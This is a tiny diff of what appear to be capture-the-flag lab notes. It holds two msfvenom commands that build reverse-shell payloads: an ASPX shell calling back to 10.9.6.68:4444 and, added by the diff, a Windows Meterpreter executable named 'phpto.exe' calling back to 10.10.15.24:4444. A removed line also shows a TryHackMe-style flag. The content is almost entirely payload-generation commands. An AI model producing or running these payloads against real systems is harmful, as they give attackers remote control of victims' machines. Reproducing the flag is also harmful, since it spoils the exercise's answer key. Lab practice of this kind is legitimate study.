@@ -1,3 +1,5 @@
 for aspx
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.6.68 LPORT=4444 — platform windows -a x64 -f aspx -o shell.aspx
-THM{1fk5kf469devlylgl320zafgl345pv}
+
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.24 LPORT=4444 -f exe -o phpto.exe
